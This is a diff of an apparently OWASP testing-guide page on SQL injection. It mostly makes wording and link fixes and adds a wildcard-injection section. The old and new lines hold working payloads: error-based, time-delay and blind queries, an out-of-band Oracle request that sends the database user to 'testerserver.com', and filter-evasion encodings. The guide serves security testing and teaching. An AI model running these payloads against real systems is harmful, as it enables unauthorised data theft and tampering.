 Where N is the number of characters that we have analyzed up to now (not counting the null value). The query will be:
 
-`SELECT field1, field2, field3 FROM Users WHERE Id='1' AND LENGTH(username)=N AND '1' = '1'`
+`SELECT field1, field2, field3 FROM Users WHERE Id='1' OR LENGTH(username)=N AND '1' = '1'`
 
 The query returns either true or false. If we obtain true, then we have completed the inference and, therefore, we know the value of the parameter. If we obtain false, this means that the null character is present in the value of the parameter, and we must continue to analyze the next parameter until we find another null value.
 
@@ -312,43 +541,43 @@ The blind SQL injection attack needs a high volume of queries. The tester may ne
 
 #### Error Based Exploitation Technique
 
-An Error based exploitation technique is useful when the tester for some reason can’t exploit the SQL injection vulnerability using other technique such as UNION. The Error based technique consists in forcing the database to perform some operation in which the result will be an error. The point here is to try to extract some data from the database and show it in the error message. This exploitation technique can be different from DBMS to DBMS (check DBMS specific section).
+An Error based exploitation technique is useful when the tester for some reason can’t exploit the SQL injection vulnerability using other techniques such as UNION. The Error-based technique consists of forcing the database to perform some operation in which the result will be an error. The point here is to try to extract some data from the database and show it in the error message. This exploitation technique can be different from DBMS to DBMS (check DBMS specific section).
 
 Consider the following SQL query:
 
 `SELECT * FROM products WHERE id_product=$id_product`
 
-Consider also the request to a script who executes the query above:
+Consider also the request to a script that executes the query above:
 
-`http://www.example.com/product.php?id=10`
+`https://www.example.com/product.php?id=10`
 
 The malicious request would be (e.g. Oracle 10g):
 
-`http://www.example.com/product.php?id=10||UTL_INADDR.GET_HOST_NAME( (SELECT user FROM DUAL) )--`
+`https://www.example.com/product.php?id=10||UTL_INADDR.GET_HOST_NAME( (SELECT user FROM DUAL) )--`
 
-In this example, the tester is concatenating the value 10 with the result of the function `UTL_INADDR.GET_HOST_NAME`. This Oracle function will try to return the hostname of the parameter passed to it, which is other query, the name of the user. When the database looks for a hostname with the user database name, it will fail and return an error message like:
+In this example, the tester is concatenating the value 10 with the result of the function `UTL_INADDR.GET_HOST_NAME`. This Oracle function will try to return the hostname of the parameter passed to it, which is another query, the name of the user. When the database looks for a hostname with the user database name, it will fail and return an error message like:
 
 `ORA-292257: host SCOTT unknown`
 
-Then the tester can manipulate the parameter passed to GET_HOST_NAME() function and the result will be shown in the error message.
+Then the tester can manipulate the parameter passed to the GET_HOST_NAME() function and the result will be shown in the error message.
 
-#### Out of Band Exploitation Technique
+#### Out-of-Band Exploitation Technique
 
-This technique is very useful when the tester find a [Blind SQL Injection](https://owasp.org/www-community/attacks/Blind_SQL_Injection) situation, in which nothing is known on the outcome of an operation. The technique consists of the use of DBMS functions to perform an out of band connection and deliver the results of the injected query as part of the request to the tester’s server. Like the error based techniques, each DBMS has its own functions. Check for specific DBMS section.
+This technique is very useful when the tester finds a [Blind SQL Injection](https://owasp.org/www-community/attacks/Blind_SQL_Injection) situation, in which nothing is known about the outcome of an operation. The technique consists of the use of DBMS functions to perform an out-of-band connection and deliver the results of the injected query as part of the request to the tester’s server. Like the error-based techniques, each DBMS has its functions. Check for specific DBMS sections.
 
 Consider the following SQL query:
 
 `SELECT * FROM products WHERE id_product=$id_product`
 
-Consider also the request to a script who executes the query above:
+Consider also the request to a script that executes the query above:
 
-`http://www.example.com/product.php?id=10`
+`https://www.example.com/product.php?id=10`
 
 The malicious request would be:
 
-`http://www.example.com/product.php?id=10||UTL_HTTP.request(‘testerserver.com:80’||(SELECT user FROM DUAL)--`
+`https://www.example.com/product.php?id=10||UTL_HTTP.request(‘testerserver.com:80’||(SELECT user FROM DUAL)--`
 
-In this example, the tester is concatenating the value 10 with the result of the function `UTL_HTTP.request`. This Oracle function will try to connect to `testerserver` and make a HTTP GET request containing the return from the query `SELECT user FROM DUAL`. The tester can set up a webserver (e.g. Apache) or use the Netcat tool:
+In this example, the tester is concatenating the value 10 with the result of the function `UTL_HTTP.request`. This Oracle function will try to connect to `testerserver` and make an HTTP GET request containing the return from the query `SELECT user FROM DUAL`. The tester can set up a web server (e.g. Apache) or use the Netcat tool:
 
 ```bash
 /home/tester/nc –nLp 80
@@ -360,19 +589,19 @@ Connection: close
 
 #### Time Delay Exploitation Technique
 
-The time delay exploitation technique is very useful when the tester find a [Blind SQL Injection](https://owasp.org/www-community/attacks/Blind_SQL_Injection) situation, in which nothing is known on the outcome of an operation. This technique consists in sending an injected query and in case the conditional is true, the tester can monitor the time taken to for the server to respond. If there is a delay, the tester can assume the result of the conditional query is true. This exploitation technique can be different from DBMS to DBMS (check DBMS specific section).
+The time delay exploitation technique is very useful when the tester finds a [Blind SQL Injection](https://owasp.org/www-community/attacks/Blind_SQL_Injection) situation, in which nothing is known about the outcome of an operation. This technique consists of sending an injected query and in case the conditional is true, the tester can monitor the time taken for the server to respond. If there is a delay, the tester can assume the result of the conditional query is true. This exploitation technique can be different from DBMS to DBMS (check DBMS specific section).
 
 Consider the following SQL query:
 
 `SELECT * FROM products WHERE id_product=$id_product`
 
-Consider also the request to a script who executes the query above:
+Consider also the request to a script that executes the query above:
 
-`http://www.example.com/product.php?id=10`
+`https://www.example.com/product.php?id=10`
 
 The malicious request would be (e.g. MySql 5.x):
 
-`http://www.example.com/product.php?id=10 AND IF(version() like ‘5%’, sleep(10), ‘false’))--`
+`https://www.example.com/product.php?id=10 AND IF(version() like ‘5%’, sleep(10), ‘false’))--`
 
 In this example the tester is checking whether the MySql version is 5.x or not, making the server to delay the answer by 10 seconds. The tester can increase the delay time and monitor the responses. The tester also doesn’t need to wait for the response. Sometimes he can set a very high value (e.g. 100) and cancel the request after some seconds.
 
@@ -402,7 +631,7 @@ anypassword
 
 This procedure does not sanitize the input, therefore allowing the return value to show an existing record with these parameters.
 
-> This example may seem unlikely due to the use of dynamic SQL to log in a user, but consider a dynamic reporting query where the user selects the columns to view. The user could insert malicious code into this scenario and compromise the data.
+> This example may seem unlikely due to the use of dynamic SQL to log in a user but consider a dynamic reporting query where the user selects the columns to view. The user could insert malicious code into this scenario and compromise the data.
 
 Consider the following SQL Server Stored Procedure:
 
@@ -427,7 +656,7 @@ This will result in the report running and all users’ passwords being updated.
 
 #### Automated Exploitation
 
-Most of the situation and techniques presented here can be performed in a automated way using some tools. In this article the tester can find information how to perform an automated auditing using [SQLMap](https://wiki.owasp.org/index.php/Automated_Audit_using_SQLMap)
+Most of the situations and techniques presented here can be performed in an automated way using some tools. In this article, the tester can find information on how to perform automated auditing using [SQLMap](https://wiki.owasp.org/index.php/Automated_Audit_using_SQLMap)
 
 ### SQL Injection Signature Evasion Techniques
 
@@ -443,7 +672,7 @@ or 'a'='a'
 or 'a'  =    'a'
 ```
 
-Adding special character like new line or tab that won't change the SQL statement execution. For example,
+Adding special characters like a new line or tab that won't change the SQL statement execution. For example,
 
 ```sql
 or
@@ -453,7 +682,7 @@ or
 
 #### Null Bytes
 
-Use null byte (%00) prior to any characters that the filter is blocking.
+Use null byte (%00) before any characters that the filter is blocking.
 
 For example, if the attacker may inject the following SQL
 
@@ -465,11 +694,11 @@ to add Null Bytes will be
 
 #### SQL Comments
 
-Adding SQL inline comments can also help the SQL statement to be valid and bypass the SQL injection filter. Take this SQL injection as example.
+Adding SQL inline comments can also help the SQL statement to be valid and bypass the SQL injection filter. Take this SQL injection as an example.
 
 `' UNION SELECT password FROM Users WHERE name='admin'--`
 
-Adding SQL inline comments will be.
+Adding SQL inline comments will be:
 
 `'/**/UNION/**/SELECT/**/password/**/FROM/**/Users/**/WHERE/**/name/**/LIKE/**/'admin'--`
 
@@ -491,13 +720,13 @@ Char() function can be used to replace English char. For example, char(114,111,1
 
 `' UNION SELECT password FROM Users WHERE name='root'--`
 
-To apply the Char(), the SQL injeciton statement will be
+To apply the Char(), the SQL injection statement will be
 
 `' UNION SELECT password FROM Users WHERE name=char(114,111,111,116)--`
 
 #### String Concatenation
 
-Concatenation breaks up SQL keywords and evades filters. Concatenation syntax varies based on database engine. Take MS SQL engine as an example
+Concatenation breaks up SQL keywords and evades filters. Concatenation syntax varies based on the database engine. Take the MS SQL engine as an example
 
 `select 1`
 
@@ -507,11 +736,11 @@ The simple SQL statement can be changed as below by using concatenation
 
 #### Hex Encoding
 
-Hex encoding technique uses Hexadecimal encoding to replace original SQL statement char. For example, `root` can be represented as `726F6F74`
+Hex encoding technique uses Hexadecimal encoding to replace the original SQL statement char. For example, `root` can be represented as `726F6F74`
 
 `Select user from users where name = 'root'`
 
-The SQL statement by using HEX value will be:
+The SQL statement by using the HEX value will be:
 
 `Select user from users where name = 726F6F74`
 
@@ -521,13 +750,13 @@ or
 
 #### Declare Variables
 
-Declare the SQL injection statement into variable and execute it.
+Declare the SQL injection statement into a variable and execute it.
 
-For example, SQL injection statement below
+For example, the SQL injection statement below
 
 `Union Select password`
 
-Define the SQL statement into variable `SQLivar`
+Define the SQL statement into the variable `SQLivar`
 
 ```sql
 ; declare @SQLivar nvarchar(80); set @myvar = N'UNI' + N'ON' + N' SELECT' + N'password');
@@ -547,6 +776,14 @@ OR 'SQLi' = N'SQLi'
 1 && 1 = 1
 ```
 
+### SQL Wildcard Injection
+
+Most SQL dialects support both single-character wildcards (usually "`?`" or "`_`") and multi-character wildcards (usually "`%`" or "`*`"), which can be used in queries with the `LIKE` operator. Even when appropriate controls (such as parameters or prepared statements) are used to protect against SQL injection attacks, it may be possible to inject wildcards into queries.
+
+For example, if a web application allows users to enter a discount code as part of the checkout process, and it checks whether this code exists in the database using a query such as `SELECT * FROM discount_codes WHERE code LIKE ':code'`, then entering a value of `%` (which would be inserted in place of the `:code` parameter) would match all of the discount codes.
+
+This technique could also be used to determine exact discount codes through increasingly specific queries (such as `a%`, `b%`, `ba%`, etc).
+
 ## Remediation
 
 - To secure the application from SQL injection vulnerabilities, refer to the [SQL Injection Prevention CheatSheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html).
@@ -557,16 +794,17 @@ For generic input validation security, refer to the [Input Validation CheatSheet
 ## Tools
 
 - [SQL Injection Fuzz Strings (from wfuzz tool) - Fuzzdb](https://github.com/fuzzdb-project/fuzzdb/tree/master/attack/sql-injection)
-- [sqlbftools](http://packetstormsecurity.org/files/43795/sqlbftools-1.2.tar.gz.html)
-- [Bernardo Damele A. G.: sqlmap, automatic SQL injection tool](http://sqlmap.org/)
+- [Bernardo Damele A. G.: sqlmap, automatic SQL injection tool](https://sqlmap.org/)
 - [Muhaimin Dzulfakar: MySqloit, MySql Injection takeover tool](https://github.com/dtrip/mysqloit)
+- [SQL Injection - PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)
 
 ## References
 
 - [Top 10 2017-A1-Injection](https://owasp.org/www-project-top-ten/2017/A1_2017-Injection)
 - [SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
+- [SQL Injection](https://www.w3schools.com/sql/sql_injection.asp)
 
-Technology specific Testing Guide pages have been created for the following DBMSs:
+Technology-specific Testing Guide pages have been created for the following DBMSs:
 
 - [Oracle](05.1-Testing_for_Oracle.md)
 - [MySQL](05.2-Testing_for_MySQL.md)
@@ -579,14 +817,14 @@ Technology specific Testing Guide pages have been created for the following DBMS
 
 ### Whitepapers
 
-- [Victor Chapela: "Advanced SQL Injection"](http://cs.unh.edu/~it666/reading_list/Web/advanced_sql_injection.pdf)
+- [Victor Chapela: "Advanced SQL Injection"](https://www.cs.unh.edu/~it666/reading_list/Web/advanced_sql_injection.pdf)
 - [Chris Anley: "More Advanced SQL Injection"](https://www.cgisecurity.com/lib/more_advanced_sql_injection.pdf)
 - [David Litchfield: "Data-mining with SQL Injection and Inference"](https://dl.packetstormsecurity.net/papers/attack/sqlinference.pdf)
 - [Imperva: "Blinded SQL Injection"](https://www.imperva.com/lg/lgw.asp?pid=369)
 - [PortSwigger: "SQL Injection Cheat Sheet"](https://portswigger.net/web-security/sql-injection/cheat-sheet)
 - [Kevin Spett from SPI Dynamics: "Blind SQL Injection"](https://repo.zenk-security.com/Techniques%20d.attaques%20%20.%20%20Failles/Blind_SQLInjection.pdf)
 - ["ZeQ3uL" (Prathan Phongthiproek) and "Suphot Boonchamnan": "Beyond SQLi: Obfuscate and Bypass"](https://www.exploit-db.com/papers/17934/)
-- [Adi Kaploun and Eliran Goshen, Check Point Threat Intelligence & Research Team: "The Latest SQL Injection Trends"](http://blog.checkpoint.com/2015/05/07/latest-sql-injection-trends/)
+- [Adi Kaploun and Eliran Goshen, Check Point Threat Intelligence & Research Team: "The Latest SQL Injection Trends"](https://blog.checkpoint.com/latest-sql-injection-trends/)
 
 ### Documentation on SQL Injection Vulnerabilities in Products
 
